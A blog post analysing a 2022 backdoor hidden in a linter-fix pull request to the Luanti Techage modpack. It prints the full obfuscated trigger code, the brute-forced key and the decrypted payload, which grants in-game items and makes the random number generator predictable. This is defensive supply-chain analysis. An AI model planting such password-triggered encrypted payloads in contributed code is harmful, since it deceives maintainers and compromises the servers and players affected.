---
title: The Luanti Techage Backdoor
tags: Anecdotes Informational Luanti
cover_alt: The main screenshot of the Techage package showing the machines and such that are provided by the modpack. The code for the backdoor is semi-transparently overlaid to the right of the image.
---

In early January of 2022, a modpack for Luanti (named Minetest at the time) called [Techage](https://content.luanti.org/packages/joe7575/techage_modpack/) received a pull request from a well known community member by the name of HybridDog. The pull request was about adding a config file for the Lua static analyser Luacheck, and then going through the mod's codebase to fix any warnings that it found.

At a first glance, it looks like a pretty typical maintenance and code quality PR. But within this noise of line changes to fix linter warnings, there was an odd and ominous piece of code that was added, heavily obfuscated with an encrypted payload and hidden in plain sight. A backdoor.

<!--more-->

## The pull request
The pull request can be found as [#71](https://github.com/joe7575/techage/pull/71) in the Techage repository, and looks innocious at a first glance. A maintenance PR from a known community member just trying to improve the quality of the mod ecosystem.

But after reviewing the changes in the PR, joe7575 (the Techage maintainer) noticed an odd piece of code that was added to the inventory code for the Drillbox node. A heavily obfuscated piece of code that gets triggered by placing a book item into the inventory of a Drillbox.

A review comment was made pointing at the code, and HybridDog responded:

> It's a secret easter egg.

Shortly after, news about this spread to the rest of the Luanti community, and the code began to be scrutinised by more people. As the resulting code that it would execute when given the correct command was encrypted, it could have been anything to make someone gain an advantage or take control of a server, and it was assumed to be something malicious in nature. Malware, a supply chain attack, a backdoor, whatever you may want to call it.

## The backdoor
The backdoor code was put in `oil/drillbox.lua`, in the `allow_metadata_inventory_put` callback function which is ran every time an item is placed into the inventory of the Drillbox.

Normally it intends to check if the items you place in there actually belong there, but it also serves as a pretty good place to hide a backdoor that can be discreetly triggered simply by putting an item into the inventory, using written books to send arbitrary data. In this case the content of the book works as a password to execute a payload embedded and encrypted in the backdoor code.

Below is the full code for the backdoor:

```lua
if stack:get_name() == "default:book_written" then
	local key = stack:get_meta():get_string("text")
	local hash = minetest.get_password_hash("key", key)
	if hash == "ERV14RNotIbIPklZ5f2gQtAKDNc" then
		local code = minetest.decode_base64("hWRHSF8RDYiS7Ag6gicCA0iTYc3" ..
			"fUV3sQZB2VZ4FLXefGb0uunYrbuTScPazwl/SDNwaj1a0MrFhlNywzkwviv" ..
			"mrbM3jc1aU3ENI9NOTC4zQQBBjb8VKaE0sKfZ555rG1fceGwvOGicisERE2" ..
			"ByiMo64edZSMEzoicd2/mTHb+/kfM9RNza88IVwxsiMjQValdrnkesxlbea" ..
			"AW3EznWX9Y9ESDNKDUQlcg")
		code = {code:byte(1, #code)}
		local pr = PcgRandom(tonumber(key))
		for i = 1, #code do
			code[i] = (code[i] + pr:next(0, 255)) % 256
		end
		code = minetest.decompress(string.char(unpack(code)), "deflate")
		loadstring(code)()(player)
	end
end
```

The `minetest.get_password_hash` function is a part of the Luanti API that allows you to hash a username and password using Luanti's legacy password format (username + password hashed with SHA-1, then the binary representation of the hash is Base64 encoded), that was used before SRP was introduced for authentication.

Essentially it means the text in the book will be hashed with "key" prepended as a salt, and compared against the hash `111575e11368b486c83e4959e5fda042d00a0cd7` (Base64 encoded in the code). If the password in the book is correct, the remaining code will be executed, which uses the password as a key for an encryption scheme by using the key as a seed for the deterministic `PcgRandom` random number generator. With the right key then the seed will end up decrypting the payload, which is then decompressed and executed using `loadstring`.

It probably goes without saying that this kind of obfuscation of code is a serious red flag in any non-esoteric open source project. But HybridDog claimed it was simply an easter egg. As such, people swiftly began trying to crack the easter egg with a sledgehammer, by brute forcing the password that is needed to decrypt the payload.

## The payload
Due to the intended password most likely being numeric as the key is converted through `tonumber` before being passed as a seed, the potential searching range for brute forcing it was greatly reduced. Not that SHA-1 is a particularly secure hashing algorithm nowadays either.

After some time of people trying to brute force ranges of potential numbers, a match was found and the discovered key was **7598122128**. Just to check, trying to SHA-1 hash this along with the salt used gives us the exact same hash that was included in the code:

```bash
$ echo -n "key7598122128" | sha1sum -
111575e11368b486c83e4959e5fda042d00a0cd7  -
```

The number does not seem to have any significance, and was likely just chosen as a large random number or a numpad key mash.

But once the key was discovered, the encrypted Base64 encoded blob could then be decrypted by running the decryption code and dumping the result. This is what would have been executed by someone placing a book with the password inside (reformatted for readability):

```lua
return function(p)
	p:get_inventory():add_item("main", "default:mese 99")

	local x = 0
	function math.random(a, b)
		x = (x + 0.61803398874989) % 1.0
		return b and math.floor(a + (b - a)*x + 0.5)
		or a and math.floor(1 + (a - 1)*x + 0.5)
		or x
	end
end
```

It gives the player 99 Mese blocks, which is a very valuable material in Minetest Game. Since you could repeat this multiple times to run the function over and over again, you could generate enormous amounts of Mese by repeatedly taking out and putting the book back into the inventory.

It also overrides Lua's default random number generator function `math.random` and replaces it with a custom RNG that makes use of the golden ratio to generate pseudorandom numbers. The implementation itself isn't much to talk about, but its presence means that after the point that the payload is executed, the series of random numbers that are generated will be known.

Theoretically it would mean you can calculate and predict any kind of chance-based logic that uses `math.random` after this point, and as all server mods run in the same environment this would apply to any mod running in the game that makes use of `math.random` which would now use the custom implementation.

## The (alleged) plan
This is where some mad speculation comes in. Why did this happen, and what was the purpose of it?

The nature of the payload code makes it not very useful in singleplayer. It does not exfiltrate any data or do anything outside of the game environment, but manipulates in-game mechanics that you could just as well do yourself using `/giveme` commands. This code was very likely intended to end up on a multiplayer server that runs Techage, giving anyone who knows the key the ability to spawn endless amounts of Mese and predict RNG in their favour.

So the plan was likely to hide it within a sea of random line changes caused by fixing Luacheck warnings, get it merged, and then wait until the new changes populate into the modsets of multiplayer servers. Some servers might pull directly from master, or occasionally update their mods every now and then when new changes happen in upstream. Nobody would have been the wiser, and a classic open source supply chain attack scenario would have played out.

But the plan was cut short, and the pull request was rejected without merging it. And HybridDog never got their Mese.

Or that's what you might try to spin it as, to get a good story out of it.

## Closing thoughts
In some ways the payload could have been much worse, for example if rather than having a fixed payload it could have simply loaded and executed arbitrary code from the written book. Even though Luanti has a mod sandbox that would (hopefully) prevent anything that could compromise the entire server machine, mods still have a lot of power and can mess with world data, leak sensitive data related to the server world, or similar. You could cause a lot of havoc.

In the end, the intention might not even have been very malicious to begin with. However the uncertainty of an encrypted payload meant that absolutely anything could have been hidden in it, had it been merged and not discovered and cracked until after it had propagated to servers. And I would still *never* want to have this kind of code running on a multiplayer survival server I'd run, giving someone with access to the key such an unfair advantage over other players. But calling it an easter egg is not completely ridiculous for a certain cryptography nerd.

HybridDog has since then claimed to have never hidden encrypted code in any mods except for this one time with Techage. And I probably believe them, because all other contributions to Luanti and mods after that have been fully benign. And analysing the code they had come up to hide the payload is nonetheless rather interesting, three years after the fact.

In summer of 2022, I joined the ContentDB staff team as an editor, meaning I would help out with checking packages that are uploaded to ContentDB before they are approved. While most of that work is related to licensing, we also undoubtedly serve a role ensuring the safety of users when installing content for Luanti.

While I have seen benign minified Lua code without provided source (which we treat the same as obfuscation and [is forbidden per our package policies](https://content.luanti.org/policy_and_guidance/#8-security)), I have never seen any intentionally malicious code embedded in a game or mod with explicit ill intent and have never heard about anything hidden in Luanti mod code that has been on the same level as the Techage backdoor.

At least, nothing that we know about.
